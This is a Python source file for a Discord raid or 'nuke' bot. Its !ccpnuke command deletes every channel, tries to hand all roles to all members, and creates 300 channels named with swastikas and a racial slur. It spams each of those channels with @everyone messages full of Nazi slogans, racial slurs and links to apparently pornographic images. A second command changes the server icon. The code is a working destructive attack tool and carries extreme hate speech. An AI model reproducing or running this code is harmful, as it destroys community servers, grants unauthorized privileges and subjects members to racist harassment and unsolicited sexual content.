import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def hello(ctx):
    await ctx.send(f'Hello, {ctx.author.mention}!')

        
# Command: !ccpnuke
@bot.command()
async def ccpnuke(ctx):
    try:
        # Check if the bot has the required permissions to manage channels and roles
        if ctx.guild.me.guild_permissions.manage_channels and ctx.guild.me.guild_permissions.manage_roles:
            # Delete all channels
            for channel in ctx.guild.channels:
                await channel.delete()
                await asyncio.sleep(0.5)  # Add a short delay between each channel deletion

            # Give all users all roles
            for member in ctx.guild.members:
                for role in ctx.guild.roles:
                    try:
                        await member.add_roles(role)
                    except discord.Forbidden:
                        print(f"Bot doesn't have permission to assign the role: {role.name}")
                    except discord.HTTPException:
                        print(f"Error assigning role: {role.name}")

            # Create 300 channels named "卐卐卐HACKED BY CCP NIGGER卍卍卍"
            for i in range(1, 301):
                channel_name = f"卐卐卐HACKED BY CCP NIGGER卍卍卍-{i}"

                # Create the channel without checking for duplicates
                new_channel = await ctx.guild.create_text_channel(channel_name)

                # Send 5 messages in the created channel with a mention
                for _ in range(5):
                    await new_channel.send("HEIL HITLER FUCK NIGGERS 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 RAIDED BY CCP 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 R🇨🇳 A🇨🇳 I🇨🇳 D🇨🇳 E🇨🇳 D🇨🇳 🇨🇳 B🇨🇳 Y🇨🇳 🇨🇳 C🇨🇳 C🇨🇳 P https://66.media.tumblr.com/24248ddcfbbf602bad7f8606b5ebd4d1/tumblr_ntk2d0fVQY1uzzmq6o1_500.gif https://static.flyflv.com/movies/075/681/18657/thumbs/940x529/29.jpg https://th.bing.com/th/id/R.c2f891d6183672879a0c29ad0c6400d3?rik=ttBalgv0ZNgqpg&riu=http%3a%2f%2fs.smutty.com%2fmedia_smutty%2fk%2fi%2fn%2fk%2fb%2fkinkstroker-9uw8d-414356.gif&ehk=%2f6uNUfaZqR%2bPw%2fCicK9AzgR%2bR701WxDzsoWTvheSAYU%3d&risl=&pid=ImgRaw&r=0 HEIL HITLER FUCK NIGGERS 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 RAIDED CCP 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 R🇨🇳 A🇨🇳 I🇨🇳 D🇨🇳 E🇨🇳 D🇨🇳 🇨🇳 B🇨🇳 Y🇨🇳 🇨🇳 C🇨🇳 C🇨🇳 P https://66.media.tumblr.com/24248ddcfbbf602bad7f8606b5ebd4d1/tumblr_ntk2d0fVQY1uzzmq6o1_500.gif https://static.flyflv.com/movies/075/681/18657/thumbs/940x529/29.jpg https://th.bing.com/th/id/R.c2f891d6183672879a0c29ad0c6400d3?rik=ttBalgv0ZNgqpg&riu=http%3a%2f%2fs.smutty.com%2fmedia_smutty%2fk%2fi%2fn%2fk%2fb%2fkinkstroker-9uw8d-414356.gif&ehk=%2f6uNUfaZqR%2bPw%2fCicK9AzgR%2bR701WxDzsoWTvheSAYU%3d&risl=&pid=ImgRaw&r=0 HEIL HITLER FUCK NIGGERS 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 RAIDED BY CCP 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 🇨🇳 R🇨🇳 A🇨🇳 I🇨🇳 D🇨🇳 E🇨🇳 D🇨🇳 🇨🇳 B🇨🇳 Y🇨🇳 🇨🇳 C🇨🇳 C🇨🇳 P https://66.media.tumblr.com/24248ddcfbbf602bad7f8606b5ebd4d1/tumblr_ntk2d0fVQY1uzzmq6o1_500.gif https://static.flyflv.com/movies/075/681/18657/thumbs/940x529/29.jpg https://th.bing.com/th/id/R.c2f891d6183672879a0c29ad0c6400d3?rik=ttBalgv0ZNgqpg&riu=http%3a%2f%2fs.smutty.com%2fmedia_smutty%2fk%2fi%2fn%2fk%2fb%2fkinkstroker-9uw8d-414356.gif&ehk=%2f6uNUfaZqR%2bPw%2fCicK9AzgR%2bR701WxDzsoWTvheSAYU%3d&risl=&pid=ImgRaw&r=0 @everyone")

            await ctx.send("All channels deleted, all roles assigned to all users, and 300 channels named 'ccp-chat' created with 5 mentions each.")

        else:
            await ctx.send("I don't have the necessary permissions to manage channels or roles.")

    except Exception as e:
        await ctx.send(f"Error during !n command: {e}")


@bot.command()
async def photo(ctx):
    try:
        # Check if the bot has the required permissions to manage the server
        if ctx.guild.me.guild_permissions.administrator:
            # Check if an attachment exists in the message
            if ctx.message.attachments:
                # Get the first attached file
                attached_file = ctx.message.attachments[0]

                # Open and read the attached image file in binary mode
                image_bytes = await attached_file.read()

                # Change the server icon
                await ctx.guild.edit(icon=image_bytes)

                await ctx.send("Server icon changed successfully.")
            else:
                await ctx.send("No photo attached. Please attach a photo with the command.")
        else:
            await ctx.send("I don't have the necessary permissions to manage the server.")

    except Exception as e:
        await ctx.send(f"Error during !photo command: {e}")
        
def get_bot_token():
    return input("Enter your bot token: ")

# Get the bot token from the user
bot_token = get_bot_token()

# Replace "YOUR_TOKEN" with your actual bot token
bot.run(bot_token)
